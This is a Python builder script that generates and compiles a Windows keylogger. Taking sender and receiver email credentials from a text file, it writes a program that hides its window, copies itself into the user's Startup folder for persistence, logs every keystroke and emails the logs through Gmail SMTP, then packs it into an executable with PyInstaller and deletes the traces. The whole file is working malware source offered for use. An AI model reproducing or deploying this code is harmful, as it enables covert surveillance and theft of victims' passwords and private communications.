import os
with open('info.txt','r') as file:
    info=file.read()
with open("Key_Logger.py","w+") as file:
    file.write('''
import smtplib
from pynput import keyboard
from win32con import SW_HIDE
import win32gui
from getpass import getuser
username = getuser() # Get The Current Username 
startup = 'C:\\Users\\"{}"\\AppData\\Roaming\\Microsoft\\Windows\\"Start Menu"\\Programs\\Startup'.format(username)   
os.system("copy {} {}".format(__file__ , startup)) # Copy This File To Startup Directory'''.format("{}","{}","{}")+'''
def hidden():
    pid = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(pid , SW_HIDE)
{}
{}
{}
{}'''.format(
info[info.find("sender_email="):info.find("sender_pass=")].replace(" ",''),
info[info.find("sender_pass="):info.find("receiver_email=")].replace(" ",''),
info[info.find("receiver_email="):info.find("email_char_count=")].replace(" ",''),
info[info.find("email_char_count="):].replace(" ",'')
)+'''
full_log=''
word=''
def on_press(Key):
    global word
    global full_log
    global email_char_count
    global your_email

    if Key == keyboard.Key.space or Key == keyboard.Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_count:
            send_log()
            full_log = ''
    elif Key == keyboard.Key.shift_l or Key == keyboard.Key.shift_r:
        return
    elif Key == keyboard.Key.backspace:
        word = word[:-1]
    else:
        char = f\'{}\''''.format("{Key}")+'''
        char = char[1:-1]
        word += char


def send_log():
    session = smtplib.SMTP('smtp.gmail.com',587)
    session.starttls()
    text = full_log
    session.login(sender_email,sender_pass)
    session.sendmail(sender_email,receiver_email,text)

hidden()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
''')
os.system("PyInstaller --onefile Key_Logger.py")
os.system("del /q Key_Logger.py")
os.system("copy dist\\Key_Logger.exe %cd%")
os.system("del /q Key_Logger.spec")
os.system("rmdir /S /Q dist")
os.system("rmdir /S /Q build")
os.system("rmdir /S /Q __pycache__")
os.system("cls")
print("Done.\n")
print("You Can Use Key_Logger.exe Now\n")
print(".Have A Nice Day.")